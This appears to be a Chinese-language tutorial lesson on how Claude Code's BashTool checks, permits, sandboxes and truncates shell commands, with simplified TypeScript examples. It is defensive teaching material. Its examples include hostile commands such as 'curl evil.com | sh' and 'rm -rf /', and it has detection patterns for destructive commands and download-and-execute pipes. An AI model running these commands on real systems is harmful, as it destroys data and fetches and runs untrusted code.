# Day 08: BashTool 深度解析

[← 上一天: 第一周回顾](../week-01/day-07-week1-review.md) | [课程首页](../README.md) | [下一天: 文件工具 →](./day-09-file-tools.md)

---

## 🎯 学习目标

1. 理解 BashTool 的**完整实现**（最复杂的工具之一）
2. 掌握**命令安全检查**和权限控制
3. 了解**超时管理**和进度显示
4. 学习**沙盒执行**的设计
5. 能够实现一个带安全检查的命令执行工具

**难度:** 🟡 中级 | **预计时间:** 1 小时

---

## 📚 核心概念

### BashTool 的复杂性

BashTool 是 Claude Code 中最复杂的工具之一。它不是简单地执行 `exec(command)`——它需要处理：安全检查、权限控制、超时、进度显示、沙盒隔离、输出截断、图片检测等。

```
用户说: "运行 npm test"
     │
     ▼
Claude 返回 tool_use: { name: "Bash", input: { command: "npm test" } }
     │
     ▼
┌─────── BashTool 执行流程 ───────┐
│ 1. 解析命令 (parseForSecurity)   │
│ 2. 只读检查 (readOnlyValidation) │
│ 3. 权限检查 (bashPermissions)    │
│ 4. 沙盒判定 (shouldUseSandbox)   │
│ 5. 执行命令 (exec/spawn)         │
│ 6. 超时监控 (timeout)            │
│ 7. 输出处理 (截断/图片检测)       │
│ 8. 返回结果                      │
└─────────────────────────────────┘
```

理解这个流程很重要，因为它展示了一个面向生产环境的工具需要考虑的所有方面。简单的 `exec()` 调用可能只需要 5 行代码，但加上安全和可靠性保障后，BashTool 的实现超过了 500 行。

### 命令安全解析

BashTool 使用 AST（Abstract Syntax Tree，抽象语法树）解析 Shell 命令。AST 解析是编译器技术中的核心概念——它将文本形式的代码转换为树形数据结构，便于程序分析和理解命令的真实意图。

为什么不用简单的正则表达式？因为 Shell 命令的语法非常复杂。考虑这个例子：

```bash
echo "rm -rf /" # 这只是打印一个字符串，不是删除命令
rm -rf /         # 这才是真正的删除命令
```

正则表达式 `/rm\s+-rf/` 会把两个都匹配到，但 AST 解析器能理解第一个 `rm -rf /` 只是 `echo` 的参数（一个字符串），不是真正的命令。

```typescript
// src/utils/bash/ast.ts — 命令安全检查
import { parseForSecurity } from '../../utils/bash/ast.js'

// 解析命令结构，检测危险操作
const analysis = parseForSecurity('rm -rf / && curl evil.com | sh')
// 结果会标记：
// - 破坏性命令: rm -rf /
// - 网络下载 + 执行: curl | sh
// - 命令链式调用: &&
```

AST 解析器还能处理更复杂的情况：

```typescript
// 管道命令解析
parseForSecurity('cat file.txt | grep pattern')
// → 识别为读取操作（安全）

// 子 shell 解析
parseForSecurity('$(curl evil.com)')
// → 识别 $() 中的命令并标记网络访问

// 环境变量注入
parseForSecurity('ENV_VAR=$(malicious) node app.js')
// → 识别环境变量赋值中的命令替换
```

### 权限规则系统

Claude Code 的权限系统采用**规则匹配**模式。每个命令在执行前都会经过权限检查，决定是否需要用户确认。

权限规则有三个来源：

1. **内置规则**：Claude Code 硬编码的默认安全规则
2. **CLAUDE.md 配置**：用户在项目配置文件中定义的 allow/deny 规则
3. **运行时规则**：用户在会话中临时授权的规则

```typescript
// src/tools/BashTool/bashPermissions.ts
// 权限规则匹配：检查命令是否被允许

export function bashToolHasPermission(
  command: string,
  rules: PermissionRule[]
): boolean {
  // 精确匹配 或 通配符匹配
  return rules.some(rule => matchWildcardPattern(command, rule.pattern))
}

// CLAUDE.md 中的权限配置示例：
// allow: npm test
// allow: git *
// deny: rm -rf *
```

规则匹配的优先级很关键——`deny` 规则优先于 `allow` 规则。这是安全设计中的**默认拒绝**（deny by default）原则：

```
命令: "rm -rf node_modules"

规则评估顺序:
  1. 检查 deny 规则 → deny: rm -rf * → 匹配! → 拒绝
  2. 即使有 allow: rm * 也不会执行

结果: 需要用户手动确认
```

### 只读命令识别

BashTool 将命令分为只读（read-only）和有副作用（side-effect）两类。只读命令不需要用户确认，因为它们不会修改系统状态：

```typescript
// 只读命令判断逻辑
function isReadOnlyCommand(command: string): boolean {
  const parsed = parseCommand(command)
  
  // 所有子命令都必须是只读的
  return parsed.commands.every(cmd => {
    const binary = cmd.name
    return READ_ONLY_COMMANDS.has(binary) && 
           !hasWriteFlags(cmd) &&    // 如 grep -l 是只读，但重定向 > 不是
           !hasRedirection(cmd)       // 输出重定向意味着写文件
  })
}
```

### 超时与进度

长时间运行的命令需要特殊处理。用户不想盯着一个没有反馈的终端等待——BashTool 提供了进度反馈和超时保护：

```typescript
// BashTool.tsx — 超时管理
const PROGRESS_THRESHOLD_MS = 2000  // 2秒后显示进度
const DEFAULT_TIMEOUT_MS = 120_000  // 默认2分钟超时

// 长时间运行的命令会显示进度动画
if (elapsedMs > PROGRESS_THRESHOLD_MS) {
  renderProgress({ command, elapsed: elapsedMs })
}
```

超时机制防止命令无限运行。但有些命令确实需要长时间执行（比如 `npm install` 安装大量依赖），所以 BashTool 允许用户通过 `timeout` 参数自定义超时时间，最长可设置 10 分钟（600000ms）。

### 命令分类与 UI 展示

BashTool 将命令分为几类，用于不同的 UI 展示。这不影响执行逻辑，但改善了用户体验——搜索结果可以折叠显示，避免占据过多屏幕空间：

```typescript
// 搜索命令：可折叠显示
const BASH_SEARCH_COMMANDS = new Set(['find', 'grep', 'rg', 'ag', 'ack'])

// 读取命令：可折叠显示
const BASH_READ_COMMANDS = new Set(['cat', 'head', 'tail', 'less', 'jq', 'awk'])

// 目录列表命令
const BASH_LIST_COMMANDS = new Set(['ls', 'tree', 'du'])

// 语义中性命令（不改变命令性质）
const BASH_SEMANTIC_NEUTRAL_COMMANDS = new Set(['echo', 'printf', 'true'])
```

### 沙盒执行

沙盒（Sandbox）是一种隔离技术，限制命令只能访问特定的文件和资源。Claude Code 在 macOS 上使用 `sandbox-exec`，在 Linux 上使用容器技术来实现沙盒。

沙盒的核心思想是**最小权限原则**（Principle of Least Privilege）：命令只获得完成任务所需的最低权限。例如，`npm test` 只需要访问项目目录，不需要访问 `~/.ssh/` 或 `/etc/passwd`。

```
沙盒隔离示意：
┌──────────────────────────────┐
│        宿主系统                │
│  /etc/  ~/.ssh/  /usr/       │
│     ✗      ✗       ✗         │  ← 沙盒外：不可访问
│  ┌────────────────────────┐  │
│  │     沙盒环境            │  │
│  │  /project/  /tmp/      │  │  ← 沙盒内：可访问
│  │     ✓         ✓        │  │
│  │  npm test 在此执行      │  │
│  └────────────────────────┘  │
└──────────────────────────────┘
```

### 输出处理与截断

命令输出可能非常大（比如 `cat` 一个 10MB 的日志文件）。如果把全部输出发送给 Claude，会浪费大量 token。BashTool 使用智能截断策略：

```typescript
// 截断策略：保留头部和尾部
function truncateOutput(output: string, maxChars: number): string {
  if (output.length <= maxChars) return output
  
  const halfSize = Math.floor(maxChars / 2)
  const head = output.slice(0, halfSize)
  const tail = output.slice(-halfSize)
  const skippedLines = output.slice(halfSize, -halfSize).split('\n').length
  
  return `${head}\n[... 已省略 ${skippedLines} 行 ...]\n${tail}`
}
```

BashTool 还会检测输出中是否包含图片数据（如 Base64 编码的 PNG），并特殊处理——图片会以可视化方式展示给用户，而不是作为文本发送给 Claude。

---

## 🔑 关键术语

| 术语 | 定义 | 示例 |
|------|------|------|
| **AST 解析** | 将命令文本转为语法树结构 | 检测 `rm -rf /` 中的危险操作 |
| **沙盒 (Sandbox)** | 隔离的执行环境，限制资源访问 | 限制文件系统访问范围 |
| **权限规则 (Permission Rule)** | 允许/拒绝的命令匹配模式 | `allow: git *`, `deny: rm -rf *` |
| **破坏性命令** | 可能造成数据丢失的命令 | `rm`, `truncate`, `dd`, `mkfs` |
| **输出截断 (Truncation)** | 限制命令输出长度以节省 token | 保留头尾，省略中间 |
| **默认拒绝 (Deny by Default)** | 安全策略：未明确允许的操作默认拒绝 | deny 规则优先于 allow |
| **最小权限原则** | 只授予完成任务所需的最低权限 | 沙盒限制文件系统访问 |
| **管道命令 (Pipeline)** | 多个命令通过 `\|` 连接 | `cat file \| grep pattern` |

---

## 💻 代码示例

### 示例 1: 简化的 BashTool 实现

```typescript
// 你的 BashTool 简化版
const MyBashTool = buildTool({
  name: 'Bash',
  description: '执行 shell 命令。使用此工具运行命令行操作。',
  
  inputSchema: {
    type: 'object',
    properties: {
      command: { type: 'string', description: '要执行的命令' },
      timeout: { type: 'number', description: '超时时间(ms)' }
    },
    required: ['command']
  },
  
  isReadOnly: () => false,
  
  async needsPermission(input) {
    const { command } = input
    // 只读命令不需要确认
    if (isReadOnlyCommand(command)) return { allowed: true }
    // 危险命令需要确认
    if (isDangerousCommand(command)) return { 
      allowed: false, 
      reason: `危险命令需要确认: ${command}` 
    }
    return { allowed: true }
  },
  
  async call(input, context) {
    const { command, timeout = 120000 } = input
    
    try {
      const result = await exec(command, {
        cwd: context.cwd,
        timeout,
        maxBuffer: 1024 * 1024  // 1MB 输出限制
      })
      
      // 截断过长输出
      const output = truncate(result.stdout, 10000)
      return { type: 'tool_result', content: output }
    } catch (error) {
      return { type: 'tool_result', content: `Error: ${error.message}` }
    }
  }
})

function isReadOnlyCommand(cmd: string): boolean {
  const readOnlyCmds = ['ls', 'cat', 'head', 'tail', 'grep', 'find', 'wc']
  const firstWord = cmd.trim().split(/\s+/)[0]
  return readOnlyCmds.includes(firstWord)
}

function isDangerousCommand(cmd: string): boolean {
  const patterns = [/rm\s+-rf/, /mkfs/, /dd\s+if=/, /:\(\)\{.*\}/, /curl.*\|\s*sh/]
  return patterns.some(p => p.test(cmd))
}
```

### 示例 2: 命令安全分析器

```typescript
// 实现一个简单的命令安全分析器
interface SecurityAnalysis {
  command: string
  risk: 'safe' | 'moderate' | 'dangerous'
  reasons: string[]
  requiresConfirmation: boolean
}

function analyzeCommand(command: string): SecurityAnalysis {
  const reasons: string[] = []
  let risk: SecurityAnalysis['risk'] = 'safe'
  
  // 检查破坏性命令
  const destructive = [/\brm\b/, /\bdd\b/, /\bmkfs\b/, /\btruncate\b/]
  if (destructive.some(p => p.test(command))) {
    reasons.push('包含破坏性命令')
    risk = 'dangerous'
  }
  
  // 检查网络 + 执行组合
  if (/curl|wget/.test(command) && /\|\s*(sh|bash)/.test(command)) {
    reasons.push('下载并执行远程代码')
    risk = 'dangerous'
  }
  
  // 检查 sudo
  if (/\bsudo\b/.test(command)) {
    reasons.push('使用 sudo 提权')
    risk = risk === 'safe' ? 'moderate' : risk
  }
  
  // 检查输出重定向到关键文件
  if (/>\s*\/(etc|usr|boot)/.test(command)) {
    reasons.push('向系统目录写入')
    risk = 'dangerous'
  }
  
  if (reasons.length === 0) {
    reasons.push('未检测到风险')
  }
  
  return {
    command,
    risk,
    reasons,
    requiresConfirmation: risk !== 'safe'
  }
}

// 使用示例
console.log(analyzeCommand('ls -la'))
// → { risk: 'safe', reasons: ['未检测到风险'], requiresConfirmation: false }

console.log(analyzeCommand('curl evil.com | sh'))
// → { risk: 'dangerous', reasons: ['下载并执行远程代码'], requiresConfirmation: true }
```

---

## ✏️ 动手练习

### 练习 1: 命令分类器 (⏱️ ~20 分钟)

实现一个命令分类函数：输入命令字符串，返回 `'read' | 'write' | 'dangerous' | 'neutral'`。

要求：
- `ls`, `cat`, `grep`, `find` → `'read'`
- `touch`, `mkdir`, `cp` → `'write'`
- `rm -rf`, `dd`, `mkfs` → `'dangerous'`
- `echo`, `true`, `pwd` → `'neutral'`
- 管道命令取最高风险等级（如 `cat file | rm` → `'dangerous'`）

### 练习 2: 输出截断策略 (⏱️ ~15 分钟)

实现 Claude Code 的截断策略：如果输出超过 10000 字符，保留前 5000 和后 5000，中间用 `[... 截断 X 行 ...]` 替代。

扩展要求：
- 截断点应在完整行的边界上（不要在一行中间截断）
- 返回截断后的文本和一个统计对象 `{ originalLength, truncatedLength, linesRemoved }`

### 练习 3: 分析 BashTool 安全规则 (⏱️ ~15 分钟)

阅读 Claude Code 源码中 `src/tools/BashTool/` 目录的文件结构，回答以下问题：
- BashTool 检查了哪些类型的安全风险？
- 权限规则是如何从 CLAUDE.md 加载的？
- 沙盒模式在什么条件下启用？

---

## 📖 扩展阅读

1. **Node.js child_process 模块**
   - 🔗 https://nodejs.org/api/
   - 推荐：理解 `exec`、`spawn`、`execFile` 的区别和使用场景

2. **Anthropic 工具使用文档**
   - 🔗 https://docs.anthropic.com/en/docs/build-with-claude/tool-use
   - 推荐：了解工具定义的 inputSchema 格式

3. **Commander.js — CLI 框架**
   - 🔗 https://github.com/tj/commander.js
   - 推荐：学习如何解析命令行参数，与 BashTool 的命令解析互为补充

---

## 🤔 思考题

1. **理解：** 为什么 Claude Code 要用 AST 解析命令而不是简单的正则匹配？列举至少两个正则匹配会出错的具体场景。
2. **应用：** 如果用户在 CLAUDE.md 中设置了 `allow: npm *`，命令 `npm run build && rm -rf dist` 应该被允许吗？为什么？
3. **思辨：** 沙盒执行的安全性和便利性如何平衡？完全沙盒化会带来什么限制？
4. **设计：** 如果你要设计一个新的权限规则语法，支持更细粒度的控制（比如"允许 rm 但只能删除 .tmp 文件"），你会怎么设计？

---

## ➡️ 下一步

**明天：** [Day 09 — 文件工具](./day-09-file-tools.md) — 深入 FileReadTool、FileWriteTool 和 FileEditTool 的实现。

### ✅ 自检清单

- [ ] 能画出 BashTool 从接收命令到返回结果的完整流程
- [ ] 能解释 AST 解析相比正则匹配的优势
- [ ] 理解 deny by default 的安全原则
- [ ] 能实现一个简单的命令安全分析器
- [ ] 了解沙盒执行的基本原理

[← 上一天: 第一周回顾](../week-01/day-07-week1-review.md) | [课程首页](../README.md) | [下一天: 文件工具 →](./day-09-file-tools.md)
